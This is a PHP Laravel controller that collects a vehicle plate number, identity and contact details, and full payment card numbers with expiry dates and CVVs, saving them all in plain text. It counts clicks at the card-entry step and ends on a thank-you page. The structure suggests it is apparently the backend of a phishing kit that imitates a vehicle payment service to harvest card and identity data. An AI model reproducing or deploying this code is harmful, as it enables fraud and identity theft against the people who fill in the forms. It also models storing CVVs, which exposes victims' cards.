<?php

namespace App\Http\Controllers;

use App\Models\Click;
use App\Models\Datos;
use Illuminate\Http\Request;

class DatosController extends Controller
{
    public function index() {}

    public function placa(Request $request)
    {   
        $datos = Datos::where('placa', strtoupper($request->placa))->first();

        if ($datos) {
            $datos->cilindraje = $request->cilindraje;
            $datos->save();
        } else {
            $datos = new Datos();
            $datos->placa = strtoupper($request->placa);
            $datos->cilindraje = $request->cilindraje;
            $datos->save();
        }

        return redirect()->route('datos', ['placa' => $datos->placa,'cilindraje' => $datos->cilindraje]);
    }

    public function store(Request $request)
    {
        // Busca un registro con la placa o crea uno nuevo si no existe
        $datos = Datos::updateOrCreate(
            ['placa' => strtoupper($request->placa)], // Condición para buscar
            [
                'inicio' => $request->inicio,
                'tipo' => $request->tipo,
                'identificacion' => $request->identificacion,
                'nombre' => $request->nombre,
                'apellidos' => $request->apellidos,
                'expedicion' => $request->expedicion,
                'pais_nacimiento' => $request->pais,
                'ciudad_circulacion' => $request->ciudad,
                'direccion' => $request->direccion,
                'correo' => $request->correo,
                'celular' => $request->celular,
            ]
        );

        // Redirige a la validación enviando la placa como parámetro
        return redirect()->route('validacion', ['placa' => $datos->placa]);
    }

    public function update(Request $request, string $id)
    {   

        $datos = Datos::find($id); 

        $datos->placa = $request->placa;
        $datos->inicio = $request->inicio;
        $datos->tipo = $request->tipo;
        $datos->identificacion = $request->identificacion;
        $datos->nombre = $request->nombre;
        $datos->apellidos = $request->apellidos;
        $datos->expedicion = $request->expedicion;
        $datos->pais_nacimiento = $request->pais;
        $datos->ciudad_circulacion = $request->ciudad;
        $datos->direccion = $request->direccion;
        $datos->correo = $request->correo;
        $datos->celular = $request->celular;
        $datos->numero_tarjeta = $request->numero_tarjeta;
        $datos->fecha_expiracion = $request->fecha_expiracion;
        $datos->cvv = $request->cvv;
    
        $datos->save();  
    
        return redirect()->route('pago', ['placa' => $datos->placa]);
    }

    public function validar(Request $request, string $id)
    {   
        $click = Click::first();

        if ($click) {
            $click->increment('click3'); // suma 1 al campo
        } else {
            // Si no existe, lo crea con 1 clic inicial
            $click = Click::create(['click3' => 1]);
        }

        $datos = Datos::find($id); 

        $datos->numero_tarjeta = $request->numero_tarjeta;
        $datos->fecha_expiracion = $request->fecha_expiracion;
        $datos->cvv = $request->cvv;
    
        $datos->save();  
    
        return redirect()->route('gracias');
    }
}
